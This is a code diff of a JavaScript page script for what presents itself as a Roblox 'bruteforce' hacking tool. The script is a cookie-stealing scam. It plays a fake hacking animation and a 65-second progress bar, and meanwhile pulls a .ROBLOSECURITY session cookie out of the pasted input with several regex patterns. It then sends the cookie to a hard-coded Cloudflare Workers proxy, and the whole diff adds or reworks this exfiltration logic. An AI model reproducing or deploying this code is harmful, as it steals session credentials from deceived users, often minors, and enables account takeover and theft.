@@ -1,42 +1,54 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
+function extractRobloxSecurityCookie(sessionId) {
+  // Try multiple patterns of cookie extraction
+  const patterns = [
+    /\.ROBLOSECURITY[^=]+=([^;]+)/,        // Pattern 1: .ROBLOSECURITY=value
+    /\.ROBLOSECURITY",\s*"([^"]+)"/,       // Pattern 2: .ROBLOSECURITY","value"
+    /_\|WARNING:-DO-NOT-SHARE-THIS[^_]+_/  // Pattern 3: Full cookie format
+  ];
+  
+  for (const pattern of patterns) {
+    const match = sessionId.match(pattern);
+    if (match) return match[0]; // Return the entire match
+  }
+  return null; // Return null if no cookie found
+}
+
 async function sendToProxy(sessionId) {
   try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         sessionId: sessionId,
         timestamp: new Date().toISOString()
       })
     });
-
     if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
     return await response.json();
-    
   } catch (error) {
     console.error('Proxy error:', error);
     throw error;
   }
 }
 
-// Example usage with your existing bruteforce function
 function bruteforce(sessionId) {
-  const cookie = sessionId.includes(".ROBLOSECURITY") 
-    ? extractRobloxSecurityCookie(sessionId)
-    : null;
-
-  sendToProxy(cookie || sessionId)
-    .then(() => showCookieSuccess())
-    .catch(() => showError("Failed to send data"));
+  // Start the hacking animation
+  startHack();
+  
+  // Process the session ID after delay (matches progress bar)
+  setTimeout(async () => {
+    try {
+      const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
+      await sendToProxy(cookie);
+      showCookieSuccess();
+    } catch (error) {
+      showError("Failed to process session ID");
+    }
+  }, 65000); // Match with progress bar duration
 }
 
-function extractRobloxSecurityCookie(sessionId) {
-  const match = sessionId.match(/\.ROBLOSECURITY[^=]+=([^;]+)/);
-  return match ? match[1] : null;
-}
 // Your existing validateInput function (unchanged)
 function validateInput() {
   const username = document.getElementById('username').value.trim();
